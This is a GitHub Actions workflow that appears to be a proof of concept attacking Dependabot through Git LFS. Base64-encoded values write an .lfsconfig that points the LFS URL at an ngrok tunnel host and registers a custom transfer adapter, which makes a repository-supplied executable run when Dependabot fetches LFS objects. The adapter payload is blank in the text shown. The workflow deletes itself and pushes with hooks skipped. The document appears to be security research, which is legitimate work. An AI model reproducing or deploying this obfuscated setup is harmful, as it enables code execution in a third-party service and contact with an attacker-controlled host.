name: Install isolated Dependabot LFS test fixture

on:
  push:

permissions:
  contents: write

jobs:
  bootstrap:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Commit fixture with executable adapter
        env:
          ATTRIBUTES_B64: Lnlhcm4vY2FjaGUvcGF5bG9hZC5iaW4gZmlsdGVyPWxmcyBkaWZmPWxmcyBtZXJnZT1sZnMgLXRleHQK
          LFSCONFIG_B64: W2xmc10KCXVybCA9IGh0dHBzOi8vMjlmYS0yNjAxLTY0NC04NTgwLWIxMjAtOWQzNC1hOWI3LTM0NTYtNWViLm5ncm9rLWZyZWUuYXBwL2luZm8vbGZzCltsZnMgImN1c3RvbXRyYW5zZmVyLnNlbnRpbmVsLnBhdGgiXQoJYWNjZXNzID0gLi9hZGFwdGVyCg==
          DEPENDABOT_B64: dmVyc2lvbjogMgp1cGRhdGVzOgogIC0gcGFja2FnZS1lY29zeXN0ZW06IG5wbQogICAgZGlyZWN0b3J5OiAvCiAgICBzY2hlZHVsZToKICAgICAgaW50ZXJ2YWw6IGRhaWx5Cg==
          POINTER_B64: dmVyc2lvbiBodHRwczovL2dpdC1sZnMuZ2l0aHViLmNvbS9zcGVjL3YxCm9pZCBzaGEyNTY6YmJlZWJkODc5ZTFkZmY2OTE4NTQ2ZGMwYzE3OWZkZGU1MDVmMmEyMTU5MWM5YTljOTZlMzZiMDU0ZWM1YWY4MwpzaXplIDEK
          ADAPTER_B64: 
        run: |
          mkdir -p .github .yarn/cache
          printf '%s' "$ATTRIBUTES_B64" | base64 -d > .gitattributes
          printf '%s' "$LFSCONFIG_B64" | base64 -d > .lfsconfig
          printf '%s' "$DEPENDABOT_B64" | base64 -d > .github/dependabot.yml
          printf '%s' "$POINTER_B64" | base64 -d > .yarn/cache/payload.bin
          printf '%s' "$ADAPTER_B64" | base64 -d > adapter
          cat > package.json <<'JSON'
          {
            "name": "dependabot-lfs-hosted-poc",
            "private": true,
            "version": "1.0.0",
            "dependencies": {
              "is-number": "1.0.0"
            }
          }
          JSON
          chmod 755 adapter
          rm .github/workflows/bootstrap.yml
          git config user.name "Dependabot LFS test bootstrap"
          git config user.email "dependabot-lfs-test@users.noreply.github.com"
          git -c filter.lfs.clean= -c filter.lfs.smudge= -c filter.lfs.process= -c filter.lfs.required=false add -A
          git commit -m "Install isolated Dependabot Git LFS test fixture"
          git push --no-verify
